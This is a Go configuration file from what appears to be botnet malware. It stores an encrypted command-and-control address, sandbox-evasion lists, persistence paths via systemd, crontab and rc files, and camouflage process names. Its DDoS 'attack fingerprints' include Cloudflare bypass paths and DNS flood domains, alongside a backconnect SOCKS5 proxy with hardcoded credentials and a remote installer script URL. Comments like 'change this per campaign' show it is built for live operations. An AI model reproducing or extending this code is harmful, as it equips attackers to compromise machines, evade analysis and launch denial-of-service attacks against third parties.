package main

import (
	"encoding/hex"
	"strings"
	"time"
)

// ============================================================================
// CONFIGURATION
// All tuneable constants and variables live here. setup.py updates this file.
// ============================================================================

// verboseLog enables verbose logging to stdout (set false for production).
var verboseLog = true

// --- Service connection ---

// serviceAddr holds the resolved service address, decoded at runtime from rawServiceAddr.
var serviceAddr string

// configSeed is the 8-char hex seed used for key derivation.
const configSeed = "ff44c72a" //change me run setup.py

// syncToken is the shared auth token — must match server.
const syncToken = "ijAa5NmBx3E7HTOx" //change this per campaign

// buildTag must match the server's version string.
const buildTag = "proto45" //change this per campaign

// retryFloor and retryCeil define the range for randomised reconnection delays.
var retryFloor = 4 * time.Second
var retryCeil = 7 * time.Second

// --- Proxy ---

// proxyUser and proxyPass gate the SOCKS5 proxy interface.
// Default credentials are baked in at build time by setup.py.
// Can be overridden at runtime via !socksauth command.
// Protected by socksCredsMutex for concurrent read/write safety.
var proxyUser = "vision"    //change me run setup.py
var proxyPass = "vision"    //change me run setup.py

// maxSessions caps concurrent proxy connections.
var maxSessions int32 = 100

// relayEndpoints holds pre-configured relay addresses for backconnect SOCKS5.
// Format: "host:port" — bots connect OUT to these relays.
// Leave empty to require explicit relay address via !socks command.
var relayEndpoints []string

// --- Misc ---

// workerPool is the default number of concurrent workers.
var workerPool = 2024

// bufferCap is the standard buffer size for I/O operations.
const bufferCap = 256

// fetchURL is NOT encoded — needs to be easily updated per deployment.
var fetchURL = "http://127.0.0.1/mods/installer.sh"

// ============================================================================
// RUNTIME DATA (AES-128-CTR)
// No plaintext in the binary. Decoded at runtime by initRuntimeConfig().
// setup.py generates a random key per build and re-encrypts all blobs.
// Re-generate with: python3 setup.py
// ============================================================================

// Runtime-decoded values (populated by initRuntimeConfig before use)
var (
	// Sandbox / analysis detection
	sysMarkers   []string
	procFilters  []string
	parentChecks []string

	// Persistence paths
	rcTarget    string
	storeDir    string
	scriptLabel string
	binLabel    string
	unitPath    string
	unitName    string
	unitBody    string
	tmplBody    string
	schedExpr   string
	envLabel    string
	cacheLoc    string
	lockLoc     string

	// Protocol strings
	protoChallenge  string
	protoSuccess    string
	protoRegFmt     string
	protoPing       string
	protoPong       string
	protoOutFmt     string
	protoErrFmt     string
	protoStdoutFmt  string
	protoStderrFmt  string
	protoExitErrFmt string
	protoExitOk     string
	protoInfoFmt    string

	// Response messages
	msgStreamStart  string
	msgBgStart      string
	msgPersistStart string
	msgKillAck      string
	msgSocksErrFmt  string
	msgSocksStartFmt string
	msgSocksStop    string
	msgSocksAuthFmt string

	// DNS / URL infrastructure
	dohServers    []string
	dohFallback   []string
	dohAttack     []string
	resolverPool  []string
	speedTestURL  string
	dnsJsonAccept string

	// Attack fingerprints
	shortUAs        []string
	refererList     []string
	httpPaths       []string
	cfPaths         []string
	cfCookieName    string
	tcpPayload      string
	dnsFloodDomains []string
	alpnH2          string

	// System / camouflage
	camoNames      []string
	shellBin       string
	shellFlag      string
	procPrefix     string
	cmdlineSuffix  string
	pgrepBin       string
	pgrepFlag      string
	devNullPath    string
	systemctlBin   string
	crontabBin     string
	bashBin        string
)

// --- Raw blobs (IV+ciphertext, AES-128-CTR, key = XOR byte functions in opsec.go) ---
// @encrypt:single — setup.py uses these tags to identify vars for re-encryption

var rawServiceAddr, _ = hex.DecodeString("e0d88114c8730d212eccb893c94ed332e7472f94762cda5b21d713441e9283e3a9b3886ab55cef2413995ffc") //change me run setup.py

// @encrypt:slice sysMarkers
var rawSysMarkers, _ = hex.DecodeString("ac15d668a2c497a6084874306ea1e256b21b6dac12c93edf1e55e265e32d3dd67c6cdaa26e997d377b3234522a13620ba3f389a76d30315d7f8b40bff71a90988f663f6a71228ed1eafcea39cecc97a6daafb28a28859b545fbc98145d9b144d93d31721c1f105caeb47875d766e37a15c2501a7b03eccc4ebc1")
// @encrypt:slice procFilters
var rawProcFilters, _ = hex.DecodeString("d83ae8b4ee9114f2099463881c7186125e08c21e7814c66cf5aeb9f8d2abc030a3892123f2a8ad56be1c56033ecba705115f29cf3eed1b7030908cb4a55abfc67583dead7e1dbd71c9239bf8b95443eff40fa5e22eb290c707a14eed166383220acf2ee42734e930d364e5fa276658ecffde271ee7ed717086f2cdd43290a95548d308f924e78429c6d8b3a7a79d2b477ff0287e713caf498d1368f63b1ab961fc891c31ec1ab21127ce9d728f1c8ed45978cb1405f948b8d74d822a5558721c487bfa0920f4b47e0de74e8145bae8f668dc688b90208483d97c81a42e6c89a3add489949aaf064227a960d1e0533d63eca47f38807d3d176b9063f7e671e15adb4d522036d6118746fa54d5090efde85804ef376a2ebfc7236bd961a64ea3bd520678b5eec5c1e4ec07ff58f6bb160db5d9868a1f7e19f1370556543428b4f4aa81deaa10dcea0215e4db7850f21e416fde01d80f6103b6f61b5f2d20edf6e2cc8fa3f0d63dcd233130d5fc045d447d5e725cfa39e62e2619aa44b8ea87767c5382de5aef1afe4708e4e66935d20d6e2839e74e9442fc02716c5590f974748385dfa2b09149203ef1d3446a719fb9de5374a69ddc13df1cc3bb9964e6313565eb22f7986272bae931dd32fb39c8ff7a4df60f54e1e9bebb84e2498ccfab8eab26f0dbb5581e58b6a83f0d577576a8125a81de1c14399bbd8a6443be195084700e924f38878b400ad6edf9c67d852962d92ef373373c5c3c0c2764dd34ee20945cd2d44cd86bb63b3a7215e8f23408c17be0ed63cf74518b95f15729307c433bd50d464df3ce30cc441521b999a673ead0b276ce4f999be9e18e60ff1a69194c665ef077f571ae888fac7753b2f1d27f0782b675d1fe2014b2cf92ef0e730f878009637a3a50513a19297dd16b00b943eaa423b1452d4a27efffeae612371d798ee4cae6d2136d9c042817d4fd46e99d01a3b9b19459088309bf20fdbe1ae0c59e9e2adb46193e2995c07a8966c45d35650a7200df09c9f6858bb2cf3926519cae713cd01e1bb7263bfd5f359395a8343077e22a400af1b9866c13aaad78e56cd8f7fa77e05f6b98c266528a5e854d9f773e9233739ecf7fdd8bf4b0361389b99310c091ff9b1bcac5942f68a2f1b8930ab13d47d39415bf8fe9")
// @encrypt:slice parentChecks
var rawParentChecks, _ = hex.DecodeString("7e93348d14bca5f0eb8eae73a68d2f7e177bd4b4526dd72f08653949e60ac70933c5725a6545474a291f7a7d29541b0a3e3d185e0b2a30f8114b772fcbb9a078355cac5cd51bf9c15cfc29dc10397cbd62a38220f50cfb29bc881c64e74fa067418d1b7f6934dc1f86c318af2103b85ba9c65aee601deffc9ba729b1")

// @encrypt:single rcTarget
var rawRcTarget, _ = hex.DecodeString("6963606205801f66d886857ac1f61ab5e31322bd4f59717d98b1a5740f")
// @encrypt:single storeDir
var rawStoreDir, _ = hex.DecodeString("1d0030b2e820926d1fd7a85185ac08d8d896d4adec968b8cdfcd74d616709f061979f94c05")
// @encrypt:single scriptLabel
var rawScriptLabel, _ = hex.DecodeString("ce1de39bffa626db05ffee0871ffbbf9018662eb8003155e62e299b2c55f20")
// @encrypt:single binLabel
var rawBinLabel, _ = hex.DecodeString("d1b0f200d19ad996f933dae6114401b75dbd2bfd61a4356fbc020d4706")
// @encrypt:single unitPath
var rawUnitPath, _ = hex.DecodeString("95f1acaeae7b271a84637079dc763efea99eaf606ec5c43b886ad3416db3c33fb0739c8c337539a6c3dde8c09a57ca09834d242b15aa52")
// @encrypt:single unitName
var rawUnitName, _ = hex.DecodeString("5a89756f1593e33eb94e7ed7d9465d000dfe169bcfebcd8f9d06d3f4f76f727259ff10")
// @encrypt:single unitBody
var rawUnitBody, _ = hex.DecodeString("fd713d6b3aa76f1d66b9a22e0cccfee409158a0bfb7f869d46ae82cb3191bfd71b31adc698f58c47f05bb3c98d441159b326f8af8170197ab879c9f2589feea3545f9c1326662a04706296c23ab4337f2f92c985de36cb9b7beda3c92fcc463a357884c955f24355752a847e567df59cfe864ad1886914ccd5df2824b62c9fa61e46e3f1518a6a968f1a529379552daec4de9a76db4c2ab107595816d4cbcc6ca3f8e30eb11e6c79f8fc8abbd1f868fa67231fa381382111b99b67e00f32e5d00a7fb26d4f01a784cf3bb0d84b8f45")
// @encrypt:single tmplBody
var rawTmplBody, _ = hex.DecodeString("4fa5b772aa360ebf65d391063e0c9919d3c86b5638c4e7e05e0ce6313364770dbdec9bec062d1c77f38418160df382d3b2bfe85b753b7681e096f751a5d2b7e887a1f4232d50b0df4dfea1a11636bdc366570813fa29610b164511ae223cadb47194f450c2e53f56df2bceaa2d8fbeb56a45acfd02063ec79191cb9f9bbf4a7e0b2d817f92bc0ec7a1c6b45cd7733c9a94c9697c8913e93f98db9e2180c879829e39653169372f36a33310c25d2f7372881e6212de6251416fd99cf91b6fa15dd2f34c9d2a9b")
// @encrypt:single schedExpr
var rawSchedExpr, _ = hex.DecodeString("c7566cb96313190c655ff7b2c0be20292eca74fbcb15e07584")

// @encrypt:single envLabel
var rawEnvLabel, _ = hex.DecodeString("58618ddf15d137d11ae20e06403f470b9850e7fda6dd4ec5d45152326c")
// @encrypt:single cacheLoc
var rawCacheLoc, _ = hex.DecodeString("32c37221961d76d8689941b3efbd4c50b9242da1a929208667150bd86333b560be71090baf8ccb")
// @encrypt:single lockLoc
var rawLockLoc, _ = hex.DecodeString("d995744dd1bde3cb2e8ed51f8bba2d16a624e9b57799ec9352e4687e5e7ebe86dcedd19bd1c6bcc19a7a9c")

// --- Protocol blobs ---

// @encrypt:single protoChallenge
var rawProtoChallenge, _ = hex.DecodeString("1551943efd5b7cb09be46fcecc3752de93cf007126f0bb1cbea0dc0a900052")
// @encrypt:single protoSuccess
var rawProtoSuccess, _ = hex.DecodeString("efd45e0c2536ed8614d14e74e052d98c87dd15bfb479136074d49a3d")
// @encrypt:single protoRegFmt
var rawProtoRegFmt, _ = hex.DecodeString("6655a79cf434e9eee9226ac2050d59a9b4df215f49f46339430469c142337467b569264d20512767b62a142c8d664cda")
// @encrypt:single protoPing
var rawProtoPing, _ = hex.DecodeString("324110b50eea815a6727e6a2020747eb10592790")
// @encrypt:single protoPong
var rawProtoPong, _ = hex.DecodeString("c4bb54e483d9c51c9f01f4ba48023cebe5437aaf5b")
// @encrypt:single protoOutFmt
var rawProtoOutFmt, _ = hex.DecodeString("8e88078684eca2b588e399e39f806bef7c0b2fff11be72553106ce7ae8714d")
// @encrypt:single protoErrFmt
var rawProtoErrFmt, _ = hex.DecodeString("79798b75aa7863a5a62ffeb39da0a776d1a5c413cc3d23136b97")
// @encrypt:single protoStdoutFmt
var rawProtoStdoutFmt, _ = hex.DecodeString("1f189efff27a59e42b766e690cda2ee79fb4fe952658631ffb52be")
// @encrypt:single protoStderrFmt
var rawProtoStderrFmt, _ = hex.DecodeString("2612c912875dda8bb85efe30b0ddc95540ad6abb6d407b43f0e132")
// @encrypt:single protoExitErrFmt
var rawProtoExitErrFmt, _ = hex.DecodeString("5e37f94b123aeb1d349a09488a45094cbbda6017b4125b64030067a5e5df3e")
// @encrypt:single protoExitOk
var rawProtoExitOk, _ = hex.DecodeString("78f15244bc39824483990a78068756678f95679145d91202f15aafa867b1df33ae9aa6cd0cc59dc2fbad565eb227f5b0d1f6bb4abc")
// @encrypt:single protoInfoFmt
var rawProtoInfoFmt, _ = hex.DecodeString("214d0d971673520a813db18535dbf5ddb325498528802abda8")

// --- Response message blobs ---

// @encrypt:single msgStreamStart
var rawMsgStreamStart, _ = hex.DecodeString("6e9fcf9b44bebc2fc900c762a964098487fc1195c573416d2cb7c77d2f11559071bb")
// @encrypt:single msgBgStart
var rawMsgBgStart, _ = hex.DecodeString("390f836b890c5a5e6608f5ceb00b65c44881106114ecd7b8dd41f0bf1f96d68ac94ec2d3a1327792d4868fde9f50")
// @encrypt:single msgPersistStart
var rawMsgPersistStart, _ = hex.DecodeString("7720f4166e2fc4593ef5a75935434f381545df98311c67aca7a123d17e29f9e643708a9630cf8324b942ba14")
// @encrypt:single msgKillAck
var rawMsgKillAck, _ = hex.DecodeString("9dbc95378a82640f14304d964618544eb020ef38359d1b922db3d3c0f3a69ecc959818e7c09c2ffe1a7e424e5370a5d8f2368da42545aab7c8d8")
// @encrypt:single msgSocksErrFmt
var rawMsgSocksErrFmt, _ = hex.DecodeString("1cbf6ad99f1f0dd55130f601f5f7a9e23772f17dbe40166d60e725cf773359a0")
// @encrypt:single msgSocksStartFmt
var rawMsgSocksStartFmt, _ = hex.DecodeString("a98653caf4a4cfbf0824dbb630680a12f060489a0ff7ed46e8ad18701008ac092b0c276cb380684ad789d321629f08e4")
// @encrypt:single msgSocksStop
var rawMsgSocksStop, _ = hex.DecodeString("ec205720c2e69875cea36b29cd00dd391fd01e0b50cfc5abedae709445fe7f27161612be0e")
// @encrypt:single msgSocksAuthFmt
var rawMsgSocksAuthFmt, _ = hex.DecodeString("3b42c7667df4da1fe8d4cd1ce2992235b2ee4e80533a3cd52275b5c23cef9ed6b8e15a4b7eb2146a7ca22233c26475")

// --- DNS / URL infrastructure blobs ---

// @encrypt:slice dohServers
var rawDohServers, _ = hex.DecodeString("d0a8344bb3d8fb1cc8fd8e91d644f55ae49e94fd99fac27128e1f82b8ffc2a0c35ed63a53b8d7372b09cca4903c69c1a00fa5083e7f9a05af2df5403490bb755878e759bf868697e33fe70a368f7e7fa9ad14f9f9b435118507f56753a315264102551409e2d85a9f75c64705aea9c7f5f")
// @encrypt:slice dohFallback
var rawDohFallback, _ = hex.DecodeString("ee04718a1e17a1d503beea74912f952750ca57551384bec2700d0395473a407a98396850b2538e6f79aa65fa9c9a484d4708028aa0638e6f43993152bc4d9edc4762b54fd2c8b8738a3abb968c42be290d")
// @encrypt:slice dohAttack
var rawDohAttack, _ = hex.DecodeString("f8bcb64c6ee085594ba1fd10c68fc43e681baaf93293c5c5a9a794d8f731a6906d608ce8fee5a193e2ba76f98a32aac2c200ff1ebf10d532a7f218e3e051658c865035adfcadd9d3b08bae91dd6e")
// @encrypt:slice resolverPool
var rawResolverPool, _ = hex.DecodeString("4315af7c14e756bdd6375f45573f2c26ac0e53214383fbe4cd354c0bfbd23f6eb622f0b7a63ea8c7f3d2f6c2dcdf46d71df458b4a3fb9c77f551b74d7a52253d9aef5bd00d9e81de920cb3847c")
// @encrypt:single speedTestURL
var rawSpeedTestURL, _ = hex.DecodeString("b841959f56c9a2affa1717efcbf3bc1047f6d174db2152a41dd76548b51b394fa0b1e37dd28dec5e19864b9bbae324a493f1c63f56dfe0c80dfd8d767f068a")
// @encrypt:single dnsJsonAccept
var rawDnsJsonAccept, _ = hex.DecodeString("854d19091606968b247f06b74f0b5a7d56a30263f7e7bc3134922f6954fe2ab9404e2108")

// --- Attack fingerprint blobs ---

// @encrypt:slice shortUAs
var rawShortUAs, _ = hex.DecodeString("b770e4e5ebb9314f78741822e2d3372bea36febabd7d974acc7b4488f96099a2a1adcf90d8606037a4d25dd2b34a6cf567e031101643ae1a9ff29f4c9827256ce850849205a5edd8293069501035f960b5945a43cd1ee025addb5d7477ea989d2f8c7fc30da937caae40ffb58ea6da0ac13cd6ccb642beecf7df492656d6f237b2c35dd9d391bcac375f97da758e20110ccd684cbea179280daadec592b884108844b833c1e4974463366bae6ea41febe606844a5ea40fa399d505b0748afd7a87f5f5abb008d321c7b6d18cc6e292b052c66dd82d2f628a909a807ded")
// @encrypt:slice refererList
var rawRefererList, _ = hex.DecodeString("f5ad2ff9a45f8915a2d589531ce216359796efb34b369e8615dfd41e94d112928f783b3632a06cd66811cf49db37c7a42db6832af65295d81dc5ccc24545d81f67f6f4004745a3e75fbe08a2629a701c635ef62616b54fc5d94c6a")
// @encrypt:slice httpPaths
var rawHttpPaths, _ = hex.DecodeString("d71f9e530d6f47c55880ba11a2393ebf4cc30e3dfb45df4cb78ecab7cb682b7b10f7b08a75d083244bfe434b762718e1334281a29655ae3116bec6")
// @encrypt:slice cfPaths
var rawCfPaths, _ = hex.DecodeString("81607d0873c18f8833ddd2e9f0a618493a03858d9d99e138f76e6739937da1f47e6a31b43596a0a84ceb208066fb0b7b85577be141f035c062eb8ff106650be5d025c2de82f9e7c0ae")
// @encrypt:single cfCookieName
var rawCfCookieName, _ = hex.DecodeString("d993ed4c5c7589dc21e69a94fe00362df45908897c8cd1")
// @encrypt:single tcpPayload
var rawTcpPayload, _ = hex.DecodeString("95ce7ab0e159f48251c6a3fa101cda0e6cb8f08f6664a8f36a1bb36abf1b475c9b43")
// @encrypt:slice dnsFloodDomains
var rawDnsFloodDomains, _ = hex.DecodeString("5539c208cbd1604b5ded32bdfdd36cd447764cf3816b844d50e05305781ea03d1e310634f82ef828f3ff459362635303a4a9e61e7de2e172b045380489b97089b4137a1bdcb282024c9a918eec6f3ad1cf31a5aa682a7ada5c29d96c38feec")
// @encrypt:single alpnH2
var rawAlpnH2, _ = hex.DecodeString("11fc47251bedf98e90903255494008709460")

// @encrypt:slice relayEndpoints
var rawRelayEndpoints, _ = hex.DecodeString("3e001903d1e19c2154c5c47ecae30f4e0a16c37bc9a869360cb772af69a8e0273845ecacd87aef62abf7b1c9") //change me run setup.py — empty = no pre-configured relays

// --- System / camouflage blobs ---

// @encrypt:slice camoNames
var rawCamoNames, _ = hex.DecodeString("eaf3b061246a7fb1a1f057bf7d669138f47020027ce77a3d733eff7dd555dc23eb22e81bb84e8e7d7ba5f92f751dad9e3a6b1d9414")
// @encrypt:single shellBin
var rawShellBin, _ = hex.DecodeString("76c8fa68da5eacd67db935d39bf48304209b")
// @encrypt:single shellFlag
var rawShellFlag, _ = hex.DecodeString("d13eb64b0a278bef9daafe7baad3ba9aaf13")
// @encrypt:single procPrefix
var rawProcPrefix, _ = hex.DecodeString("b1a577a93f41cde28b9a309d9f6405f6f1a4baa07dbb")
// @encrypt:single cmdlineSuffix
var rawCmdlineSuffix, _ = hex.DecodeString("950960a3a456b12a9aa48549a0de04567d512a186fad78d6")
// @encrypt:single pgrepBin
var rawPgrepBin, _ = hex.DecodeString("5d2ce836043694108ab8a43bb95a43fb7de513d6d3")
// @encrypt:single pgrepFlag
var rawPgrepFlag, _ = hex.DecodeString("5ce487b8aab6283fd8cd182353cf8f53d2e0")
// @encrypt:single devNullPath
var rawDevNullPath, _ = hex.DecodeString("99e21d1a3d35fbf89326990509dad2ac645df2e38e7e9aa2b9")
// @encrypt:single systemctlBin
var rawSystemctlBin, _ = hex.DecodeString("c04ce151ddec29fe344fb1785f64df6b74b27388092c653d21")
// @encrypt:single crontabBin
var rawCrontabBin, _ = hex.DecodeString("d3ac1e2a00fd1a136b32831cb3a308021ec427cc66822b")
// @encrypt:single bashBin
var rawBashBin, _ = hex.DecodeString("8da2a295ce8233dee7d1919d83f505891ab3bd4c")

// initRuntimeConfig decodes all raw blobs into their runtime variables.
// Must be called once at startup before any code references these values.
func initRuntimeConfig() {
	// Service address (AES layer wrapping the 5-layer obfuscation)
	serviceAddr = string(garuda(rawServiceAddr))

	// Slice values (null-byte separated)
	sysMarkers = strings.Split(string(garuda(rawSysMarkers)), "\x00")
	procFilters = strings.Split(string(garuda(rawProcFilters)), "\x00")
	parentChecks = strings.Split(string(garuda(rawParentChecks)), "\x00")
	resolverPool = strings.Split(string(garuda(rawResolverPool)), "\x00")
	dohServers = strings.Split(string(garuda(rawDohServers)), "\x00")
	dohFallback = strings.Split(string(garuda(rawDohFallback)), "\x00")
	dohAttack = strings.Split(string(garuda(rawDohAttack)), "\x00")
	shortUAs = strings.Split(string(garuda(rawShortUAs)), "\x00")
	refererList = strings.Split(string(garuda(rawRefererList)), "\x00")
	httpPaths = strings.Split(string(garuda(rawHttpPaths)), "\x00")
	cfPaths = strings.Split(string(garuda(rawCfPaths)), "\x00")
	dnsFloodDomains = strings.Split(string(garuda(rawDnsFloodDomains)), "\x00")
	camoNames = strings.Split(string(garuda(rawCamoNames)), "\x00")

	// Persistence paths
	rcTarget = string(garuda(rawRcTarget))
	storeDir = string(garuda(rawStoreDir))
	scriptLabel = string(garuda(rawScriptLabel))
	binLabel = string(garuda(rawBinLabel))
	unitPath = string(garuda(rawUnitPath))
	unitName = string(garuda(rawUnitName))
	unitBody = string(garuda(rawUnitBody))
	tmplBody = string(garuda(rawTmplBody))
	schedExpr = string(garuda(rawSchedExpr))
	envLabel = string(garuda(rawEnvLabel))
	cacheLoc = string(garuda(rawCacheLoc))
	lockLoc = string(garuda(rawLockLoc))

	// Protocol strings
	protoChallenge = string(garuda(rawProtoChallenge))
	protoSuccess = string(garuda(rawProtoSuccess))
	protoRegFmt = string(garuda(rawProtoRegFmt))
	protoPing = string(garuda(rawProtoPing))
	protoPong = string(garuda(rawProtoPong))
	protoOutFmt = string(garuda(rawProtoOutFmt))
	protoErrFmt = string(garuda(rawProtoErrFmt))
	protoStdoutFmt = string(garuda(rawProtoStdoutFmt))
	protoStderrFmt = string(garuda(rawProtoStderrFmt))
	protoExitErrFmt = string(garuda(rawProtoExitErrFmt))
	protoExitOk = string(garuda(rawProtoExitOk))
	protoInfoFmt = string(garuda(rawProtoInfoFmt))

	// Response messages
	msgStreamStart = string(garuda(rawMsgStreamStart))
	msgBgStart = string(garuda(rawMsgBgStart))
	msgPersistStart = string(garuda(rawMsgPersistStart))
	msgKillAck = string(garuda(rawMsgKillAck))
	msgSocksErrFmt = string(garuda(rawMsgSocksErrFmt))
	msgSocksStartFmt = string(garuda(rawMsgSocksStartFmt))
	msgSocksStop = string(garuda(rawMsgSocksStop))
	msgSocksAuthFmt = string(garuda(rawMsgSocksAuthFmt))

	// DNS / URL infrastructure
	speedTestURL = string(garuda(rawSpeedTestURL))
	dnsJsonAccept = string(garuda(rawDnsJsonAccept))

	// Attack fingerprints
	cfCookieName = string(garuda(rawCfCookieName))
	tcpPayload = string(garuda(rawTcpPayload))
	alpnH2 = string(garuda(rawAlpnH2))

	// Relay endpoints (optional — empty blob means none configured)
	if len(rawRelayEndpoints) > 0 {
		relayEndpoints = strings.Split(string(garuda(rawRelayEndpoints)), "\x00")
	}

	// System / camouflage
	shellBin = string(garuda(rawShellBin))
	shellFlag = string(garuda(rawShellFlag))
	procPrefix = string(garuda(rawProcPrefix))
	cmdlineSuffix = string(garuda(rawCmdlineSuffix))
	pgrepBin = string(garuda(rawPgrepBin))
	pgrepFlag = string(garuda(rawPgrepFlag))
	devNullPath = string(garuda(rawDevNullPath))
	systemctlBin = string(garuda(rawSystemctlBin))
	crontabBin = string(garuda(rawCrontabBin))
	bashBin = string(garuda(rawBashBin))
}
